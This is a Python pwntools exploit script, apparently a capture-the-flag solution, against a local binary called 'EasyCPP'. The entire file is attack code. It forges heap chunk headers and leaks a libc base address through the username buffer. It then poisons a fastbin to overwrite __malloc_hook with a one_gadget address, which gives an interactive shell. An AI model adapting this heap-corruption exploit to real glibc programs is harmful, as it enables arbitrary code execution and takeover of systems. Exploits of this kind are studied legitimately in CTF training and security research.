from pwn import *
context.log_level='debug'
context.terminal=['tmux','splitw','-h']
p=process("./EasyCPP")
e=ELF("./EasyCPP")
libc=ELF("/libc64.so")
def edit(pswd,s):
    p.sendlineafter("choice:","1")
    p.sendafter("Your new password: \n",pswd)
    p.sendafter("Tell me the new STUDENT NUMBER(eg: PB19000001), please:\n",s)
    p.sendlineafter("):","100")
    p.sendlineafter(":","100")
    p.sendlineafter(":","100")
    p.sendlineafter(":","100")

def dbg(code=""):
    gdb.attach(p,code)

p.recv()
p.sendline('admin'.ljust(8,'a')+p64(0x91))
p.recv()
p.send('p455w0rd')

payload='\x00'*0x78+p64(0x21)+p64(e.sym['username']+0x10)+p64(0)*2+p64(0x21)
#dbg("b*0x00000000004020FC")
edit(payload[:-1],'1')
p.recvuntil(": ")
libc.address=u64(p.recv(6)+'\x00\x00')-0x3c4b31
print hex(libc.address)
edit('\x00','1')
edit('\x00','1')
edit('\x00','1')
edit('\x00','1')
payload=p64(0)+p64(0x71)+'\x00'*0x60+p64(0)+p64(0x21)+p64(e.sym['password']+0x10)
edit(payload[:-1],'1')
p.sendlineafter("choice:","2")
payload=p64(0x71)*2+p64(libc.sym['__malloc_hook']-0x23)
p.sendafter("password: \n",payload)
payload='a'*0x13+p64(libc.address+0xf02a4)
payload=payload.ljust(0x60,'\x00')
edit('\x00','\x00'*0x60)
edit('\x00',payload)
p.sendlineafter("choice:",'1')
p.sendlineafter("password: ",'1')
p.interactive()
